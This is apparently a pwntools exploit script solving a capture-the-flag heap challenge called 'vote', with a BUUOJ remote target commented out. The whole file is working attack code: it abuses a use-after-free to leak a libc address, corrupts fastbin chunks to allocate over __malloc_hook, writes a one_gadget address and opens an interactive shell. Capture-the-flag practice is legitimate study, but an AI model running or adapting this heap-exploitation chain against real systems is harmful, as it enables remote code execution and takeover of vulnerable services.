from pwn import *
r = process('./vote')
#r = remote('node3.buuoj.cn', 25145)
libc = ELF('/libc-2.23.so')
elf = ELF('./vote')

def add(size, name):
	r.recvuntil('Action: ')
	r.sendline('0')
	r.recvuntil("Please enter the name's size: ")
	r.sendline(str(size))
	r.recvuntil('Please enter the name: ')
	r.sendline(name)

def show(index):
	r.recvuntil('Action: ')
	r.sendline('1')
	r.recvuntil('Please enter the index: ')
	r.sendline(str(index))

def free(index):
	r.recvuntil('Action: ')
	r.sendline('4')
	r.recvuntil('Please enter the index: ')
	r.sendline(str(index)) 

	

add(0xb0,'fuck')
add(0xb0,'fuck')
free(0)
show(0)
r.recvuntil('time:')
leak = int(r.recvuntil('\n',drop=True))
main_arena = leak - 0x58
libc_base = main_arena - 0x3c4b20
log.success(hex(libc_base))

add(0x50,'fuck')
add(0x10,'fuck')
free(1)
add(0x50, p64(0)*3+p64(0xd1))
add(0x70,'fuck')
free(1)
add(0x50, p64(0)*5+p64(0x71))

free(1)
free(2)
free(4)

add(0x50,p64(0)*3+p64(0x71)+p64(main_arena-0x33))
add(0x50,'fuck')
add(0x50,'fuck')
one = libc_base + 0xf1147
payload = 'a'*0x3 + p64(one)
add(0x50, payload)
r.sendline('0')
r.recvuntil('size:')
r.sendline('1')
r.interactive()
